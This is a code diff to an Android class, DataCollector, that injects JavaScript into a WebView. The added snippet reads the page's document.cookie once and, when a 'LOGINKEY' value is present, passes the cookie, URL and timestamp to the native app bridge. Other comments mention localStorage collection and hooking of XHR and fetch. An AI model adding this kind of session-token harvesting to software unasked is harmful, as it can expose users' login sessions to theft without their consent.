@@ -8,6 +8,7 @@ import android.webkit.WebView;
  * - localStorage 데이터 수집
  * - XHR/fetch API 후킹
  * - mybook HTML 파싱 (페이지네이션 순회)
+ * - document.cookie 수집 (LOGINKEY)
  */
 public class DataCollector {
     private static final String TAG = "DataCollector";
@@ -69,6 +70,24 @@ public class DataCollector {
                 "  }" +
                 "})();";
             wv.evaluateJavascript(readJS, null);
+
+            // 3) document.cookie 수집 (최초 1회만)
+            String cookieJS =
+                "(function() {" +
+                "  if (window.__cookieCollected) return;" +
+                "  window.__cookieCollected = true;" +
+                "  var c = document.cookie || '';" +
+                "  if (c && c.indexOf('LOGINKEY') >= 0) {" +
+                "    var payload = JSON.stringify({" +
+                "      source: 'cookie'," +
+                "      cookie: c," +
+                "      timestamp: new Date().toISOString()," +
+                "      url: window.location.href" +
+                "    });" +
+                "    if (window.Android) Android.sendData(payload);" +
+                "  }" +
+                "})();";
+            wv.evaluateJavascript(cookieJS, null);
         }, 5000);
     }
 
